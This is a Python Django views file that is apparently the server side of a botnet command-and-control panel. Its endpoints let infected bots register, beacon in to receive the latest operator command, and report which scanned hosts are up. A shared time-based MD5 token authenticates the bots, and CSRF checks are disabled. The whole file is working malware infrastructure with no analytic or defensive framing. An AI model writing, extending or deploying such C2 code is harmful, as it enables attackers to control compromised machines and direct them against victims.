from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
from .models import Bot, Command, Host
from .forms import cmdForm
import time, hashlib

# Create your views here.
def index(request):
    return render(request, 'index.html')


@csrf_exempt
def reg(request):
    botId = request.POST.get('botId', False)
    botName = request.POST.get('botName', False)
    auth = request.POST.get('auth', False)
    botPlat = request.POST.get('platform', False)
    t = request.POST.get('t', False)
    if botId and botName and botPlat and t and auth == genTimeSeed():
        try:
            bot = Bot.objects.get(botId=botId)
        except Exception, e:
            bot = Bot(botId=botId, botName=botName, lastSeen=t, platform=botPlat)
            bot.lastSeen = t
            bot.save()
            return render(request, 'botAdded.html')
        bot.lastSeen = t
        bot.save()
    return render(request, 'index.html')


@csrf_exempt
def beacon(request):
    params = request.POST
    botId = params.get('botId', False)
    t = params.get('t', False)
    auth = params.get('auth', False)
    if botId and t and auth == genTimeSeed():
        bot = Bot.objects.get(botId=botId)
        if bot:
            bot.lastSeen = t
            bot.save()
            cmd = Command.objects.all()
            x = None
            for command in cmd:
                x = command
            context = {'bot' : x.botId, 'cmd' : x.cmd}
            return render(request, 'run.html', context)
    return render(request, 'index.html')

@csrf_exempt
def ping(request):
    if request.method == "POST":
        post = request.POST
        botId = post.get('botId', False)
        botName = post.get('botName', False)
        host = post.get('host', False)
        auth = post.get('auth', False)
        up = post.get('up', False)
        if botId and botName and host and up and auth == genTimeSeed():
            h = Host(botId=botId, botName=botName, host=host, up=up)
            h.save()
    return render(request, 'index.html')



def cmd(request):
    if request.method == 'POST':
        form = cmdForm(request.POST)
        if form.is_valid():
            form.process()
    else:
        form = cmdForm()
    bots = Bot.objects.all()
    context = {'form' : form, 'bots' : bots}
    return render(request, 'command.html', context)




def genTimeSeed():
    seed = roundDown(int(time.time()), 5)
    return hashlib.md5(str(seed)).hexdigest()

def roundDown(num, factor):
    return num - (num%factor)